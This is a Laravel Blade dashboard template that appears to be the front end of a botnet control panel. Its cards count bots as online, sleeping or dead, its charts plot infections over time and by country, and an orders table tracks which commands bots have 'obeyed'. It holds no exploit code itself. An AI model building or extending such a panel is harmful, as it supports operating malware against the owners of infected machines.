@extends('Panel.Master.Master')

@section('content')

    <div class="col-md-3 bots" >
        <div class="panel panel-default">
            <div class="panel-body cards">
                <div class="svg-in-panel " >

                    <img class="col-centered" src="{{ URL::asset('img/252133.svg') }}" style="width: 37px;">
                    <p>All</p>

                </div>
                <div class="info-in-panel">
                    <p>0</p>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3 online" >
        <div class="panel panel-default">
            <div class="panel-body cards">

                <div class="svg-in-panel" >

                    <img class="col-centered" src="{{ URL::asset('img/604145.svg') }}" style="width: 32px;">
                    <p style="margin-top: 3px;">Online</p>

                </div>
                <div class="info-in-panel">
                    <p>0</p>
                </div>

            </div>
        </div>
    </div>
    <div class="col-md-3 sleep" >
        <div class="panel panel-default">

            <div class="panel-body cards">

                <div class="svg-in-panel" >

                    <img class="col-centered" src="{{ URL::asset('img/249385.svg') }}" style="width: 31px;">
                    <p style="    margin-top: 3px;">Sleep</p>

                </div>
                <div class="info-in-panel">
                    <p>0</p>
                </div>

            </div>

        </div>
    </div>
    <div class="col-md-3 dead" >
        <div class="panel panel-default">
            <div class="panel-body cards">
                <div class="svg-in-panel" >
                    <img class="col-centered" src="{{ URL::asset('img/218206.svg') }}" style="width: 37px;">
                    <p>Deads</p>

                </div>
                <div class="info-in-panel">
                    <p>0</p>
                </div>
            </div>
        </div>

    </div>

    <div class="col-md-12">
        <div class="panel panel-default">
            <div class="panel-body "  style="  overflow: scroll; ">

                <div class="row-in-panel "id="mainChart" style="height: 205px; border-bottom: 1px solid #e6e6e600;text-align: center">

                    <canvas id="myChart" style="width: 100%; height: 100% "></canvas>


                </div>

            </div>
        </div>
    </div>

    <div class="col-md-6" >

        <div class="panel panel-default">

            <div class="panel-body" id="countryChart"  style="height: 200px; text-align: center">

                <canvas id="myChart2"  style="width: 100%; height: 100% "></canvas>


                </div>
        </div>

    </div>
    <div class="col-md-6">

        <div class="panel panel-default">
            <div class="panel-body "  style="height: 200px">

                <div class="row-in-panel-less header">
                    <div class="info-row" style="width: 10%; border-left: 1px solid white">
                        <p>N</p>
                    </div>
                    <div class="info-row" style="width: 60%">
                        <p>Data</p>
                    </div>
                    <div class="info-row" style="width: 20%; border-right: 1px solid white">
                        <p>Obeyed</p>
                    </div>
                    <div class="info-row" style="width: 10%; border-right: 1px solid white">
                        <p>Status</p>
                    </div>
                </div>
                <!--LOOP-->
                <div class="info-orders"></div>


            </div>
        </div>

    </div>

@endsection


@section('Script')
    <script>
            var svg1 = '<img class="col-centered" src="{{ URL::asset('img/594598.svg') }}" style="width: 69px; margin-top: 65px; display:block">';
            var svg2 = '<img class="col-centered" src="{{ URL::asset('img/594598.svg') }}" style="width: 39px; margin-top: 35px; display:block">';
            var textInfo = '<p style="margin-top: 5px; color: white">Not enough data to display Chart</p>'

            function reCall_(data){

                let cards = data['cards_info'];
                let charts = data['charts_info'];
                let orders = data['orders_info'];
                let countries = data['countries_info'];

                function popCards(array){
                    $('.bots .info-in-panel p').html(array['bots']);
                    $('.online .info-in-panel p').html(array['online']);
                    $('.sleep .info-in-panel p').html(array['sleep']);
                    $('.dead .info-in-panel p').html(array['dead']);
                }
                function popCharts(array){

                    let infected_v = array['infected'];
                    let dead_v = array['dead'];
                    let label = array['label'];
                    let status = array['status'];

                    if(status === 1){
                        var ctx = document.getElementById("myChart").getContext('2d');
                        Chart.defaults.global.defaultFontColor = '#ffffff';
                        var myChart = new Chart(ctx, {
                            type: 'line',
                            data: {
                                labels: label,
                                datasets: [
                                    {
                                        label: 'Infected',
                                        data: infected_v,
                                        fill:false,
                                        backgroundColor: [
                                            'rgba(153, 102, 255, 0.2)',
                                        ],
                                        borderColor: [
                                            '#3aff82',
                                        ],
                                        lineTension:0.5,
                                        borderWidth: 1.5
                                    },
                                    {
                                        label: 'Deads',
                                        data: dead_v,
                                        fill:false,
                                        backgroundColor: [
                                            'rgba(255, 63, 97, 0.2)'
                                        ],
                                        borderColor: [
                                            '#dca5ff'
                                        ],
                                        lineTension:0.4,
                                        borderWidth: 1.5
                                    },
                                ]
                            },
                            options: {
                                scales: {
                                    yAxes: [{
                                        gridLines: {
                                            display: false,

                                            color: '#ffffff',
                                            lineWidth: 0.4
                                        },
                                    }],
                                    xAxes: [{
                                        gridLines: {
                                            display: false,
                                            color: '#ffffff',
                                            lineWidth: 0.4
                                        },
                                    }]
                                },
                                legend: {
                                    labels: {
                                        // This more specific font property overrides the global property
                                        fontColor: '#ffffff'
                                    }
                                }
                            }
                        });
                    }else{

                        $('#mainChart').html(svg1);
                        $('#mainChart').append(textInfo);

                    }

                }
                function popOrders(array){
                    $('.info-orders').empty();
                    array['array'].forEach(function (el){
                        console.log(el);
                        let html = '<div class="row-in-panel-less line">'+
                                        '<div class="info-row" style="width: 10%;border-left: 1px solid white">'+
                                            '<p>'+el['id']+'</p>'+
                                        '</div>'+
                                        '<div class="info-row" style="width: 60%;overflow-x: auto; white-space: nowrap;">'+
                                            '<p>'+el['data']+'</p>'+
                                        '</div>'+
                                    '<div class="info-row" style="width: 20%;">'+
                                        '<p>'+el['obeyed']+'</p>' +
                                        '</div>' +
                                        '<div class="info-row" style="width: 10%; border-right: 1px solid white">' +
                                        '<p>'+el['status']+'</p>' +
                                        '</div>' +
                                        '</div>';

                        $('.info-orders').append(html);

                    });
                }
                function popCountries(array){
                    let l = array['labels'];
                    let v = array['values'];
                    let status = array['status'];

                    if(status === 1){
                        var myBarChart = new Chart(document.getElementById("myChart2").getContext('2d'), {
                            type: 'bar',
                            data: {
                                labels: l,
                                datasets: [
                                    {
                                        label: "Countries",
                                        backgroundColor:  [
                                            'rgba(60, 60, 60, 0.5)',
                                            'rgba(60, 60, 60, 0.5)',
                                            'rgba(60, 60, 60, 0.5)',
                                            'rgba(255, 159, 64, 0.5)'
                                        ],
                                        borderColor: [
                                            '#dcffff',
                                            '#dcffff',
                                            '#dcffff'
                                        ],
                                        borderWidth: 1,
                                        data: v,
                                    }
                                ]
                            },
                            options: {
                                scales: {


                                    xAxes: [{
                                        stacked: true
                                    }],
                                    yAxes: [{
                                        stacked: true
                                    }]
                                }
                            }
                        });
                    }else{
                        $('#countryChart').html(svg2);
                        $('#countryChart').append(textInfo);
                    }
                }

                popCards(cards);
                popCharts(charts);
                popOrders(orders);
                popCountries(countries);

            }

            function refreshFunction(){
                ajax({dataRequest: 'boardMain'});
            }
            ajax({dataRequest: 'boardMain'});

            setInterval(refreshFunction,60000);
    </script>
@endsection
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.1/Chart.bundle.min.js"></script>

@section('css')
    <style>
        .dataJsonTitle{
            color:#6e63e8
        }
        .dataJsonLight{
            font-size: 90%;
            font-weight: lighter;
        }
        .row-in-panel-less.header{
             width: 100%;
             height: 23px;
             border-top: 1px solid white;
             border-bottom: 1px solid white;
         }
        .row-in-panel-less.line{
            width: 100%;
            height: 23px;
            border-top: 1px solid white;
            border-bottom: 1px solid white;
        }
        .row-in-panel-less p{
            font-size: 75%;
            margin-top: 5px;
        }
        .info-row{
            float: left;
            text-align: center;
            border-right: 1px solid white;
            height: 100%;
        }
        .info-row p{
            color: #ffffff;
        }

        .row-in-panel.header{
            width: 100%;
            height: 23px;
            border-top: 1px solid white;
            border-bottom: 1px solid white;
        }
        .row-in-panel.header .table-row{
            float: left;
            text-align: center;
            border-right: 1px solid white;
            height: 100%;
        }
        .row-in-panel{
            width: 100%;
            height: 23px;
            border-bottom: 1px solid white;
        }
        .row-in-panel .table-row{
            float: left;
            text-align: center;
            border-right: 1px solid white;
            height: 100%;
        }
        .table-row p{
            color: #ffffff;
        }
        .row-in-panel.line .table-row p{
            font-size: 75%;
            margin-top:5px;

        }

        .info-in-panel{
            float: right;
            width: 45px;
            text-align: center;
        }
        .info-in-panel p{
            color: white;
            font-size: 110%;
        }
        .svg-in-panel{
            text-align: center;
            width: 50px;
            float: left;
        }
        .svg-in-panel img{
            margin-top: -20px;
            z-index: 999999
        }
        .svg-in-panel p{
            color: white;
        }
        .panel-body.cards{
            height: 80px;
        }/**/
    </style>
@endsection